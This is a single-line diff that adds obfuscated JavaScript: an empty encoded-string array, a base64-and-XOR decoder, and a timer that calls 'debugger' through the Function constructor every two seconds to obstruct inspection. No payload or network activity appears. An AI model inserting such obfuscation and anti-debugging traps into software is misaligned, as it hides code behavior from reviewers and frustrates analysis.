@@ -1,0 +1,1 @@
+(function(){const _0xP43f = [];const _0xSD = function(idx) {    let s = atob(_0xP43f[idx]);    let res = '';    for(let i=0; i<s.length; i++) {        res += String.fromCharCode(s.charCodeAt(i) ^ 114);    }    return res;};(function(){const _0xDb=function(){if(function(){return false}['constructor']('debugger')['call']('action')){}else{}};setInterval(_0xDb,2000);})();})();
